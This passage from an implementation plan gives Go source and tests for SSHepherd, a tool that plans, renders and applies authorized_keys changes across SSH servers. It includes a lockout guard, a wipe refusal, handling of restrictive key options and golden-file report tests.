	return strings.Join(strings.Fields(err.Error()), " ")
}

// label mirrors audit's row label: the owning user (with their comment:
// when set), or "(unknown)" for a key the manifest does not know.
func label(cfg *config.Config, k authkeys.Key) string {
	u, ok := cfg.OwnerOf(k.Fingerprint)
	if !ok {
		return "(unknown)"
	}
	if u.Comment != "" {
		return fmt.Sprintf("%s (%s)", u.Name, u.Comment)
	}
	return u.Name
}

// Render writes the plan report — the operator's review surface before the
// confirmation gate. Outcome lines and the final Summary are
// RenderSummary's: they exist only once phase 2 has run or been skipped.
func Render(w io.Writer, cfg *config.Config, plans []ServerPlan, opts RenderOptions) {
	if len(plans) == 0 {
		fmt.Fprintln(w, "Summary: 0 servers targeted — nothing to apply")
		return
	}
	pal := palette{on: opts.Color}
	for _, p := range plans {
		head := fmt.Sprintf("%s (%s@%s:%d)", p.Server.Name, p.Server.User, p.Server.Host, p.Server.Port)
		switch p.Class {
		case ClassUnreachable:
			fmt.Fprintf(w, "%s  %s %s\n\n", head, pal.paint(codeRed, "ERROR:"), oneLine(p.Err))
		case ClassConverged:
			fmt.Fprintf(w, "%s  converged (no changes)\n\n", head)
		case ClassRefused:
			fmt.Fprintf(w, "%s  %s %s\n\n", head, pal.paint(codeBoldRed, "REFUSED:"), p.Refusal)
		default:
			fmt.Fprintln(w, head)
			renderChange(w, cfg, p, pal)
			fmt.Fprintln(w)
		}
	}
}

func renderChange(w io.Writer, cfg *config.Config, p ServerPlan, pal palette) {
	tw := tabwriter.NewWriter(w, 0, 0, 2, ' ', 0)
	for _, k := range p.Add {
		fmt.Fprintf(tw, "  %s\t%s\t%s\t%s\tadd (authorized, missing)\n",
			pal.paint(codeGreen, "+"), label(cfg, k), k.Fingerprint, k.Type)
	}
	for _, k := range p.Remove {
		fmt.Fprintf(tw, "  %s\t%s\t%s\t%s\tremove (unauthorized)\n",
			pal.paint(codeRed, "-"), label(cfg, k), k.Fingerprint, k.Type)
	}
	for _, rw := range p.Rewrites {
		fmt.Fprintf(tw, "  %s\t%s\t%s\t%s\t%s\n",
			pal.paint(codeYellow, "~"), label(cfg, rw.Key), rw.Key.Fingerprint, rw.Key.Type, rewriteDetail(rw))
	}
	if p.Normalize.Any() {
		fmt.Fprintf(tw, "  %s\t(formatting)\t\t\tnormalize: %s\n",
			pal.paint(codeYellow, "~"), normalizeDetail(p.Normalize))
	}
	_ = tw.Flush()

	if p.FileAbsent {
		// The audit diagnostic, carried into the plan: creating the audited
		// file is purely additive and never blocks apply.
		fmt.Fprintln(w, "  note: the audited file is absent yet login succeeded — sshd may consult")
		fmt.Fprintln(w, "        another key source; creating the file is purely additive")
	}
	if p.Note != "" {
		fmt.Fprintf(w, "  note: %s\n", p.Note)
	}
	if p.Warning != "" {
		fmt.Fprintf(w, "  %s %s\n", pal.paint(codeYellow, "warning:"), p.Warning)
	}
	fmt.Fprintf(w, "  → %d keys desired · %d add · %d remove · %d rewrite\n",
		len(p.Desired), len(p.Add), len(p.Remove), len(p.Rewrites))
}

func rewriteDetail(rw RewriteRow) string {
	switch {
	case rw.CommentDiffers && rw.OptionsDiffer:
		// %q escapes any control bytes a hostile on-server comment carries.
		return fmt.Sprintf("rewrite options · comment: %q → %q", rw.ActualComment, rw.DesiredComment)
	case rw.OptionsDiffer:
		return "rewrite options"
	default:
		return fmt.Sprintf("rewrite comment: %q → %q", rw.ActualComment, rw.DesiredComment)
	}
}

func normalizeDetail(n Normalize) string {
	var parts []string
	if n.Reorder {
		parts = append(parts, "reordering")
	}
	if n.NonKeyLines > 0 {
		parts = append(parts, fmt.Sprintf("removing %d non-key lines (comments/blank)", n.NonKeyLines))
	}
	if n.Whitespace {
		parts = append(parts, "whitespace/format")
	}
	return strings.Join(parts, "; ")
}

// RenderSummary writes the phase-2 outcome lines (one per written, refused,
// or failed server) and the final Summary. "Converged" counts servers that
// needed nothing and servers applied-and-verified this run.
func RenderSummary(w io.Writer, plans []ServerPlan, opts RenderOptions) {
	if len(plans) == 0 {
		return // Render already printed the 0-servers summary
	}
	pal := palette{on: opts.Color}
	var converged, applied, pending, refused, failed, unreachable int
	for _, p := range plans {
		switch p.Class {
		case ClassConverged:
			converged++
		case ClassRefused:
			refused++
		case ClassUnreachable:
			unreachable++
		case ClassChange:
			switch p.Outcome {
			case OutcomeApplied:
				converged++
				applied++
				fmt.Fprintf(w, "%s: %s\n", p.Server.Name, pal.paint(codeGreen, "applied · verified"))
			case OutcomeRefused:
				refused++
				fmt.Fprintf(w, "%s: %s %s\n", p.Server.Name, pal.paint(codeBoldRed, "REFUSED:"), oneLine(p.OutcomeErr))
			case OutcomeFailed:
				failed++
				fmt.Fprintf(w, "%s: %s %s\n", p.Server.Name, pal.paint(codeRed, "FAILED:"), oneLine(p.OutcomeErr))
			default:
				pending++
			}
		}
	}
	line := fmt.Sprintf("Summary: %d/%d servers converged", converged, len(plans))
	if applied > 0 {
		line += fmt.Sprintf(" (%d applied)", applied)
	}
	for _, seg := range []struct {
		n     int
		label string
	}{{pending, "pending"}, {failed, "failed"}, {refused, "refused"}, {unreachable, "unreachable"}} {
		if seg.n > 0 {
			line += fmt.Sprintf(" · %d %s", seg.n, seg.label)
		}
	}
	fmt.Fprintf(w, "%s  → exit %d\n", line, ExitCode(plans))
}
```

(`errors`/`sshwrite` live in exec.go, not here: `OutcomeRefused` is produced by `errors.As` on `*sshwrite.SymlinkError` in `applyOne`.)

- [ ] **Step 7.4: Write the failing plan tests**

Create `internal/apply/plan_test.go`:

```go
package apply

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/audit"
	"github.com/javadh75/SSHepherd/internal/authkeys"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/testkeys"
)

// fakeReader returns canned phase-1 results per server name.
type fakeReader struct {
	byName map[string]audit.ReadResult
	errs   map[string]error
}

func (f *fakeReader) ReadAuthorizedKeys(_ context.Context, srv config.Server) (audit.ReadResult, error) {
	if err, ok := f.errs[srv.Name]; ok {
		return audit.ReadResult{}, err
	}
	return f.byName[srv.Name], nil
}

// buildPlans runs the real pipeline (audit.Run + Build) over a fake fleet —
// exactly what the command does, minus SSH.
func buildPlans(t *testing.T, cfg *config.Config, r audit.KeyReader, agentFPs []string) []ServerPlan {
	t.Helper()
	results := audit.Run(context.Background(), cfg, r, audit.Options{Parallel: 4})
	plans, err := Build(cfg, results, agentFPs)
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	return plans
}

// planFor pulls one server's plan out by name.
func planFor(t *testing.T, plans []ServerPlan, name string) ServerPlan {
	t.Helper()
	for _, p := range plans {
		if p.Server.Name == name {
			return p
		}
	}
	t.Fatalf("no plan for %s", name)
	return ServerPlan{}
}

// fp is shorthand for a test key's fingerprint.
func fp(t *testing.T, seed byte) string {
	t.Helper()
	k, err := authkeys.ParseLine(testkeys.Line(t, seed))
	if err != nil || k == nil {
		t.Fatalf("fp(%d): %v", seed, err)
	}
	return k.Fingerprint
}

// planCfg: op (operator, k1, comment op@sshepherd) everywhere; alice (k2,
// comment alice@work) -> web-1; bob (k3, no comment -> name floor) -> web-1.
func planCfg(t *testing.T) *config.Config {
	t.Helper()
	y := `
users:
  - {name: op, operator: true, comment: "op@sshepherd", keys: ["` + testkeys.Line(t, 1) + `"]}
  - {name: alice, comment: "alice@work", keys: ["` + testkeys.Line(t, 2) + `"]}
  - {name: bob, keys: ["` + testkeys.Line(t, 3) + `"]}
servers:
  - {name: web-1, host: 10.0.0.1, user: deploy}
access:
  - {user: alice, servers: [web-1]}
  - {user: bob, servers: [web-1]}
`
	cfg, err := config.Parse([]byte(y))
	if err != nil {
		t.Fatalf("planCfg: %v", err)
	}
	return cfg
}

// renderedFor renders a server's desired file exactly as Build does.
func renderedFor(t *testing.T, cfg *config.Config, name string) []byte {
	t.Helper()
	out, err := authkeys.Render(desiredEntries(cfg, name))
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	return out
}

func TestPlanConvergedIsByteExact(t *testing.T) {
	cfg := planCfg(t)
	r := &fakeReader{byName: map[string]audit.ReadResult{
		"web-1": {Content: renderedFor(t, cfg, "web-1")},
	}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if p.Class != ClassConverged {
		t.Fatalf("Class = %s, want converged (bytes equal the render)", p.Class)
	}
}

func TestPlanAuditCleanIsNotApplyConverged(t *testing.T) {
	// Fingerprint-set equality is NOT convergence: same keys, but no managed
	// header and audit-style comments — the first apply normalizes it.
	cfg := planCfg(t)
	content := testkeys.Line(t, 1) + " op@sshepherd\n" + testkeys.Line(t, 2) + " alice@work\n" + testkeys.Line(t, 3) + " bob\n"
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {Content: []byte(content)}}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if p.Class != ClassChange {
		t.Fatalf("Class = %s, want change (byte drift: missing header)", p.Class)
	}
	if len(p.Add)+len(p.Remove)+len(p.Rewrites) != 0 {
		t.Errorf("rows = %d/%d/%d, want none (keys/comments/options all match)",
			len(p.Add), len(p.Remove), len(p.Rewrites))
	}
	if !p.Normalize.Whitespace {
		t.Errorf("Normalize = %+v, want the whitespace/format residual", p.Normalize)
	}
}

func TestPlanAddRemoveRewriteNormalize(t *testing.T) {
	cfg := planCfg(t)
	// On web-1: op present with the desired comment, bob present with a
	// stale comment (rewrite), alice missing (add), a stranger key
	// (remove), plus one hand comment and one blank line (normalize), and
	// bob listed before op (reorder).
	content := "# hand-written note\n" +
		testkeys.Line(t, 3) + " bob@old\n" +
		testkeys.Line(t, 1) + " op@sshepherd\n" +
		"\n" +
		testkeys.Line(t, 9) + " stray@laptop\n"
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {Content: []byte(content)}}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")

	if p.Class != ClassChange {
		t.Fatalf("Class = %s, want change", p.Class)
	}
	if len(p.Add) != 1 || p.Add[0].Fingerprint != fp(t, 2) {
		t.Errorf("Add = %+v, want exactly alice's key", p.Add)
	}
	if len(p.Remove) != 1 || p.Remove[0].Fingerprint != fp(t, 9) {
		t.Errorf("Remove = %+v, want exactly the stray key", p.Remove)
	}
	if len(p.Rewrites) != 1 {
		t.Fatalf("Rewrites = %+v, want one (bob's comment)", p.Rewrites)
	}
	rw := p.Rewrites[0]
	if !rw.CommentDiffers || rw.OptionsDiffer || rw.ActualComment != "bob@old" || rw.DesiredComment != "bob" {
		t.Errorf("rewrite = %+v, want comment bob@old -> bob (name floor)", rw)
	}
	if !p.Normalize.Reorder {
		t.Error("Normalize.Reorder = false, want true (bob before op on the server)")
	}
	if p.Normalize.NonKeyLines != 2 {
		t.Errorf("NonKeyLines = %d, want 2 (one comment + one blank)", p.Normalize.NonKeyLines)
	}
	if string(p.Rendered) != string(renderedFor(t, cfg, "web-1")) {
		t.Error("Rendered must be exactly the desired render — it is what phase 2 writes")
	}
}

func TestPlanRewriteOptions(t *testing.T) {
	cfg := planCfg(t)
	content := string(renderedFor(t, cfg, "web-1"))
	// Same file, but bob's line grew a no-pty option on the server.
	content = strings.Replace(content, testkeys.Line(t, 3), "no-pty "+testkeys.Line(t, 3), 1)
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {Content: []byte(content)}}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if len(p.Rewrites) != 1 || !p.Rewrites[0].OptionsDiffer || p.Rewrites[0].CommentDiffers {
		t.Fatalf("Rewrites = %+v, want exactly one options-only rewrite", p.Rewrites)
	}
}

func TestPlanFileAbsentIsAdditiveChange(t *testing.T) {
	cfg := planCfg(t)
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {FileAbsent: true}}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if p.Class != ClassChange || !p.FileAbsent {
		t.Fatalf("plan = %+v, want an additive change carrying the file-absent diagnostic", p)
	}
	if len(p.Add) != 3 || len(p.Remove) != 0 {
		t.Errorf("Add/Remove = %d/%d, want 3/0", len(p.Add), len(p.Remove))
	}
}

func TestPlanParseErrorRefused(t *testing.T) {
	cfg := planCfg(t)
	content := testkeys.Line(t, 1) + " op@sshepherd\nthis is not a key\n"
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {Content: []byte(content)}}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if p.Class != ClassRefused || !strings.Contains(p.Refusal, "unparseable") {
		t.Fatalf("plan = %+v, want refusal over the unparseable line", p)
	}
}

func TestPlanUnreachable(t *testing.T) {
	cfg := planCfg(t)
	r := &fakeReader{errs: map[string]error{"web-1": errors.New("dial tcp: connection refused")}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if p.Class != ClassUnreachable || p.Err == nil {
		t.Fatalf("plan = %+v, want unreachable with the error retained", p)
	}
}

// emptyDesiredCfg: a fleet with no operators and a grantless server.
func emptyDesiredCfg(t *testing.T) *config.Config {
	t.Helper()
	y := `
users:
  - {name: alice, keys: ["` + testkeys.Line(t, 2) + `"]}
servers:
  - {name: web-1, host: 10.0.0.1, user: deploy}
  - {name: bare, host: 10.0.0.2, user: deploy}
access:
  - {user: alice, servers: [web-1]}
`
	cfg, err := config.Parse([]byte(y))
	if err != nil {
		t.Fatalf("emptyDesiredCfg: %v", err)
	}
	return cfg
}

func TestPlanEmptyDesiredSplit(t *testing.T) {
	cfg := emptyDesiredCfg(t)
	web1 := renderedFor(t, cfg, "web-1")
	tests := []struct {
		name        string
		read        audit.ReadResult
		wantClass   Class
		wantRefusal string
	}{
		{"file absent is converged", audit.ReadResult{FileAbsent: true}, ClassConverged, ""},
		{"empty file is converged", audit.ReadResult{Content: []byte("")}, ClassConverged, ""},
		{"comments-only file is converged", audit.ReadResult{Content: []byte("# just notes\n")}, ClassConverged, ""},
		{"installed keys refuse the wipe", audit.ReadResult{Content: []byte(testkeys.Line(t, 9) + "\n" + testkeys.Line(t, 8) + "\n" + testkeys.Line(t, 7) + "\n")},
			ClassRefused, "3 keys installed but manifest grants none — refusing to wipe"},
		{"unparseable content refuses too", audit.ReadResult{Content: []byte("garbage\n")},
			ClassRefused, "unparseable"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {Content: web1}, "bare": tt.read}}
			p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 2)}), "bare")
			if p.Class != tt.wantClass {
				t.Fatalf("Class = %s, want %s", p.Class, tt.wantClass)
			}
			if tt.wantRefusal != "" && !strings.Contains(p.Refusal, tt.wantRefusal) {
				t.Errorf("Refusal = %q, want it to contain %q", p.Refusal, tt.wantRefusal)
			}
		})
	}
}

func TestGuardRefusesLockout(t *testing.T) {
	cfg := planCfg(t)
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {FileAbsent: true}}}
	// The agent holds only a key the manifest never grants to web-1.
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 9), fp(t, 8)}), "web-1")
	if p.Class != ClassRefused {
		t.Fatalf("Class = %s, want refused (predicted lockout)", p.Class)
	}
	for _, want := range []string{"none of the 2 keys in this agent", "lock this session out", "operator: true"} {
		if !strings.Contains(p.Refusal, want) {
			t.Errorf("Refusal = %q, want it to contain %q", p.Refusal, want)
		}
	}
}

func TestGuardOperatorAlwaysPasses(t *testing.T) {
	// An operator key is in every desired set, so holding it passes the
	// guard on every server — the structural operator contract.
	cfg := planCfg(t)
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {FileAbsent: true}}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if p.Class != ClassChange {
		t.Fatalf("Class = %s, want change (operator key held)", p.Class)
	}
}

func TestGuardRotateNoteSessionKeyRemoved(t *testing.T) {
	cfg := planCfg(t)
	// The session authenticated with stray key 9 (installed, not desired);
	// the agent also holds op's key, which survives — rotate is allowed,
	// loudly.
	content := testkeys.Line(t, 9) + " old@key\n"
	r := &fakeReader{byName: map[string]audit.ReadResult{
		"web-1": {Content: []byte(content), SessionKeyFP: fp(t, 9)},
	}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 9), fp(t, 1)}), "web-1")
	if p.Class != ClassChange {
		t.Fatalf("Class = %s, want change (op key survives)", p.Class)
	}
	if !strings.Contains(p.Note, "removes the key this session logged in with") ||
		!strings.Contains(p.Note, "op remains") {
		t.Errorf("Note = %q, want the rotate note naming the survivor", p.Note)
	}
}

func TestGuardNoNoteWhenSessionKeySurvives(t *testing.T) {
	cfg := planCfg(t)
	r := &fakeReader{byName: map[string]audit.ReadResult{
		"web-1": {FileAbsent: true, SessionKeyFP: fp(t, 1)},
	}}
	p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
	if p.Note != "" {
		t.Errorf("Note = %q, want none (the session key stays desired)", p.Note)
	}
}

func TestGuardEmptyAgentFallback(t *testing.T) {
	cfg := planCfg(t)
	t.Run("additive-only write proceeds", func(t *testing.T) {
		r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {FileAbsent: true}}}
		p := planFor(t, buildPlans(t, cfg, r, nil), "web-1")
		if p.Class != ClassChange {
			t.Fatalf("Class = %s, want change (nothing removed)", p.Class)
		}
	})
	t.Run("removal is refused", func(t *testing.T) {
		r := &fakeReader{byName: map[string]audit.ReadResult{
			"web-1": {Content: []byte(testkeys.Line(t, 9) + "\n")},
		}}
		p := planFor(t, buildPlans(t, cfg, r, nil), "web-1")
		if p.Class != ClassRefused || !strings.Contains(p.Refusal, "agent key listing is unavailable") {
			t.Fatalf("plan = %+v, want the empty-listing refusal", p)
		}
	})
}

func TestGuardRestrictiveOptionsWarning(t *testing.T) {
	y := `
users:
  - {name: op, operator: true, keys: ["restrict,command=\"/usr/bin/false\" ` + testkeys.Line(t, 1) + `"]}
  - {name: alice, keys: ["` + testkeys.Line(t, 2) + `"]}
servers:
  - {name: web-1, host: 10.0.0.1, user: deploy}
access:
  - {user: alice, servers: [web-1]}
`
	cfg, err := config.Parse([]byte(y))
	if err != nil {
		t.Fatalf("config: %v", err)
	}
	r := &fakeReader{byName: map[string]audit.ReadResult{"web-1": {FileAbsent: true}}}
	t.Run("all surviving keys restricted warns", func(t *testing.T) {
		p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1)}), "web-1")
		if p.Class != ClassChange {
			t.Fatalf("Class = %s, want change (warning, not refusal)", p.Class)
		}
		if !strings.Contains(p.Warning, "restrictive option") {
			t.Errorf("Warning = %q, want the restrictive-options warning", p.Warning)
		}
	})
	t.Run("an unrestricted survivor clears the warning", func(t *testing.T) {
		p := planFor(t, buildPlans(t, cfg, r, []string{fp(t, 1), fp(t, 2)}), "web-1")
		if p.Warning != "" {
			t.Errorf("Warning = %q, want none (alice's plain key survives too)", p.Warning)
		}
	})
}

func TestHasRestrictiveOption(t *testing.T) {
	tests := []struct {
		name    string
		options []string
		want    bool
	}{
		{"none", nil, false},
		{"benign", []string{"no-pty", "no-agent-forwarding"}, false},
		{"restrict", []string{"restrict"}, true},
		{"from", []string{`from="10.0.0.0/8"`}, true},
		{"command", []string{`command="/bin/true"`}, true},
		{"expiry", []string{`expiry-time="20270101"`}, true},
		{"case-insensitive", []string{`FROM="10.0.0.1"`}, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := hasRestrictiveOption(tt.options); got != tt.want {
				t.Errorf("hasRestrictiveOption(%v) = %v, want %v", tt.options, got, tt.want)
			}
		})
	}
}

func TestExitCode(t *testing.T) {
	ch := func(o Outcome) ServerPlan { return ServerPlan{Class: ClassChange, Outcome: o} }
	tests := []struct {
		name  string
		plans []ServerPlan
		want  int
	}{
		{"empty fleet", nil, 0},
		{"all converged", []ServerPlan{{Class: ClassConverged}}, 0},
		{"applied counts as converged", []ServerPlan{{Class: ClassConverged}, ch(OutcomeApplied)}, 0},
		{"pending (dry-run/declined)", []ServerPlan{ch(OutcomePending)}, 1},
		{"failed", []ServerPlan{ch(OutcomeFailed)}, 1},
		{"refused late (symlink)", []ServerPlan{ch(OutcomeRefused)}, 1},
		{"refused in plan", []ServerPlan{{Class: ClassRefused}}, 1},
		{"unreachable", []ServerPlan{{Class: ClassUnreachable}}, 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ExitCode(tt.plans); got != tt.want {
				t.Errorf("ExitCode = %d, want %d", got, tt.want)
			}
		})
	}
}
```

- [ ] **Step 7.5: Write the failing exec tests**

Create `internal/apply/exec_test.go`:

```go
package apply

import (
	"context"
	"errors"
	"sync"
	"testing"

	"github.com/javadh75/SSHepherd/internal/authkeys"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshwrite"
	"github.com/javadh75/SSHepherd/internal/testkeys"
)

// fakeWriter records Apply calls and returns scripted errors per server.
type fakeWriter struct {
	mu    sync.Mutex
	calls map[string][]byte
	errs  map[string]error
}

func (f *fakeWriter) Apply(_ context.Context, srv config.Server, content []byte) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.calls == nil {
		f.calls = make(map[string][]byte)
	}
	f.calls[srv.Name] = content
	return f.errs[srv.Name]
}

func testKey(t *testing.T, seed byte) authkeys.Key {
	t.Helper()
	k, err := authkeys.ParseLine(testkeys.Line(t, seed))
	if err != nil || k == nil {
		t.Fatalf("testKey: %v", err)
	}
	return *k
}

func TestExecuteOutcomes(t *testing.T) {
	held := testKey(t, 1)
	change := func(name string) ServerPlan {
		return ServerPlan{
			Server:   config.Server{Name: name},
			Class:    ClassChange,
			Outcome:  OutcomePending,
			Desired:  []authkeys.Key{held},
			Rendered: []byte("rendered for " + name + "\n"),
		}
	}
	plans := []ServerPlan{
		change("ok-1"),
		{Server: config.Server{Name: "already"}, Class: ClassConverged},
		change("boom"),
		change("sym"),
		{Server: config.Server{Name: "refused"}, Class: ClassRefused},
	}
	w := &fakeWriter{errs: map[string]error{
		"boom": errors.New("write on boom failed"),
		"sym":  &sshwrite.SymlinkError{Path: "/etc/keys"},
	}}
	Execute(context.Background(), plans, w, ExecOptions{Parallel: 2, AgentFPs: []string{held.Fingerprint}})

	if got := planFor(t, plans, "ok-1"); got.Outcome != OutcomeApplied {
		t.Errorf("ok-1 Outcome = %s, want applied", got.Outcome)
	}
	if string(w.calls["ok-1"]) != "rendered for ok-1\n" {
		t.Errorf("writer got %q, want exactly the plan's Rendered bytes", w.calls["ok-1"])
	}
	if got := planFor(t, plans, "boom"); got.Outcome != OutcomeFailed || got.OutcomeErr == nil {
		t.Errorf("boom = %s/%v, want failed with the error retained", got.Outcome, got.OutcomeErr)
	}
	if got := planFor(t, plans, "sym"); got.Outcome != OutcomeRefused {
		t.Errorf("sym Outcome = %s, want refused (symlink is a refusal, not a failure)", got.Outcome)
	}
	for _, untouched := range []string{"already", "refused"} {
		if _, called := w.calls[untouched]; called {
			t.Errorf("%s was written despite not being ClassChange", untouched)
		}
	}
}

func TestExecuteGuardRecheck(t *testing.T) {
	notHeld := testKey(t, 2)
	t.Run("no desired key held", func(t *testing.T) {
		plans := []ServerPlan{{
			Server: config.Server{Name: "s"}, Class: ClassChange, Outcome: OutcomePending,
			Desired: []authkeys.Key{notHeld}, Rendered: []byte("x\n"),
		}}
		w := &fakeWriter{}
		Execute(context.Background(), plans, w, ExecOptions{Parallel: 1, AgentFPs: []string{fp(t, 1)}})
		if plans[0].Outcome != OutcomeFailed || len(w.calls) != 0 {
			t.Fatalf("outcome = %s, calls = %d — the re-check must block the write", plans[0].Outcome, len(w.calls))
		}
	})
	t.Run("empty listing blocks removals only", func(t *testing.T) {
		plans := []ServerPlan{
			{Server: config.Server{Name: "removes"}, Class: ClassChange, Outcome: OutcomePending,
				Desired: []authkeys.Key{notHeld}, Remove: []authkeys.Key{testKey(t, 9)}, Rendered: []byte("x\n")},
			{Server: config.Server{Name: "adds"}, Class: ClassChange, Outcome: OutcomePending,
				Desired: []authkeys.Key{notHeld}, Rendered: []byte("y\n")},
		}
		w := &fakeWriter{}
		Execute(context.Background(), plans, w, ExecOptions{Parallel: 1})
		if planFor(t, plans, "removes").Outcome != OutcomeFailed {
			t.Error("a removal must not proceed under an empty agent listing")
		}
		if planFor(t, plans, "adds").Outcome != OutcomeApplied {
			t.Error("an additive write may proceed under an empty agent listing")
		}
	})
}
```

- [ ] **Step 7.6: Write the failing report tests**

Create `internal/apply/report_test.go`:

```go
package apply

import (
	"bytes"
	"errors"
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/audit"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/testkeys"
)

var update = flag.Bool("update", false, "rewrite golden files")

func checkGolden(t *testing.T, name string, got []byte) {
	t.Helper()
	path := filepath.Join("testdata", name)
	if *update {
		if err := os.WriteFile(path, got, 0o644); err != nil {
			t.Fatalf("update golden: %v", err)
		}
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read golden (run with -update first): %v", err)
	}
	if !bytes.Equal(got, want) {
		t.Errorf("output differs from %s:\n--- got ---\n%s\n--- want ---\n%s", path, got, want)
	}
}

// mixedCfg: alice (k2, comment) -> web-1+web-2; bob (k3) -> web-1; db-1 has
// no grants (wipe refusal); web-3 will be unreachable. No operators, so the
// empty-desired path is reachable.
func mixedCfg(t *testing.T) *config.Config {
	t.Helper()
	y := `
users:
  - {name: alice, comment: "alice@work", keys: ["` + testkeys.Line(t, 2) + `"]}
  - {name: bob, keys: ["` + testkeys.Line(t, 3) + `"]}
servers:
  - {name: db-1, host: 10.0.0.9, user: deploy}
  - {name: web-1, host: 10.0.0.1, user: deploy}
  - {name: web-2, host: 10.0.0.2, user: deploy}
  - {name: web-3, host: 10.0.0.3, user: deploy}
access:
  - {user: alice, servers: [web-1, web-2]}
  - {user: bob, servers: [web-1]}
`
	cfg, err := config.Parse([]byte(y))
	if err != nil {
		t.Fatalf("mixedCfg: %v", err)
	}
	return cfg
}

// mixedPlans builds the full four-class scenario: web-1 change (add bob,
// remove stray, rewrite alice's comment, normalize a hand comment),
// web-2 converged, db-1 refused (wipe), web-3 unreachable.
func mixedPlans(t *testing.T) (*config.Config, []ServerPlan) {
	t.Helper()
	cfg := mixedCfg(t)
	web1 := "# legacy note\n" +
		testkeys.Line(t, 2) + " alice@old\n" +
		testkeys.Line(t, 9) + " stray@laptop\n"
	r := &fakeReader{
		byName: map[string]audit.ReadResult{
			"web-1": {Content: []byte(web1), SessionKeyFP: fp(t, 2)},
			"web-2": {Content: renderedFor(t, cfg, "web-2")},
			"db-1":  {Content: []byte(testkeys.Line(t, 8) + "\n")},
		},
		errs: map[string]error{"web-3": errors.New("dial tcp 10.0.0.3:22: connection refused")},
	}
	return cfg, buildPlans(t, cfg, r, []string{fp(t, 2)})
}

func TestRenderPlanMixedGolden(t *testing.T) {
	cfg, plans := mixedPlans(t)
	var buf bytes.Buffer
	Render(&buf, cfg, plans, RenderOptions{})
	out := buf.String()
	for _, want := range []string{
		"add (authorized, missing)",
		"remove (unauthorized)",
		`rewrite comment: "alice@old" → "alice@work"`,
		"normalize: removing 1 non-key lines (comments/blank)",
		"→ 2 keys desired · 1 add · 1 remove · 1 rewrite",
		"web-2 (deploy@10.0.0.2:22)  converged (no changes)",
		"db-1 (deploy@10.0.0.9:22)  REFUSED: 1 keys installed but manifest grants none — refusing to wipe",
		"web-3 (deploy@10.0.0.3:22)  ERROR:",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("report lacks %q:\n%s", want, out)
		}
	}
	checkGolden(t, "plan_mixed.golden", buf.Bytes())
}

func TestRenderPlanMixedColorGolden(t *testing.T) {
	cfg, plans := mixedPlans(t)
	var buf bytes.Buffer
	Render(&buf, cfg, plans, RenderOptions{Color: true})
	if !strings.Contains(buf.String(), "\x1b[0;32m+\x1b[0m") {
		t.Errorf("color output lacks the painted add glyph:\n%q", buf.String())
	}
	checkGolden(t, "plan_mixed_color.golden", buf.Bytes())
}

func TestRenderColorStrippedEqualsPlain(t *testing.T) {
	cfg, plans := mixedPlans(t)
	var plain, color bytes.Buffer
	Render(&plain, cfg, plans, RenderOptions{})
	Render(&color, cfg, plans, RenderOptions{Color: true})
	stripped := color.String()
	for _, code := range []string{codeGreen, codeRed, codeBoldRed, codeYellow} {
		stripped = strings.ReplaceAll(stripped, "\x1b["+code+"m", "")
	}
	stripped = strings.ReplaceAll(stripped, "\x1b[0m", "")
	if stripped != plain.String() {
		t.Error("color output with SGR stripped must be byte-identical to plain")
	}
}

func TestRenderSummaryAppliedGolden(t *testing.T) {
	_, plans := mixedPlans(t)
	for i := range plans {
		if plans[i].Class == ClassChange {
			plans[i].Outcome = OutcomeApplied
		}
	}
	var buf bytes.Buffer
	RenderSummary(&buf, plans, RenderOptions{})
	out := buf.String()
	for _, want := range []string{
		"web-1: applied · verified",
		"Summary: 2/4 servers converged (1 applied) · 1 refused · 1 unreachable  → exit 1",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("summary lacks %q:\n%s", want, out)
		}
	}
	checkGolden(t, "summary_applied.golden", buf.Bytes())
}

func TestRenderSummaryPendingGolden(t *testing.T) {
	_, plans := mixedPlans(t)
	var buf bytes.Buffer
	RenderSummary(&buf, plans, RenderOptions{})
	want := "Summary: 1/4 servers converged · 1 pending · 1 refused · 1 unreachable  → exit 1\n"
	if buf.String() != want {
		t.Errorf("dry-run summary = %q, want %q (no outcome lines for pending)", buf.String(), want)
	}
	checkGolden(t, "summary_pending.golden", buf.Bytes())
}

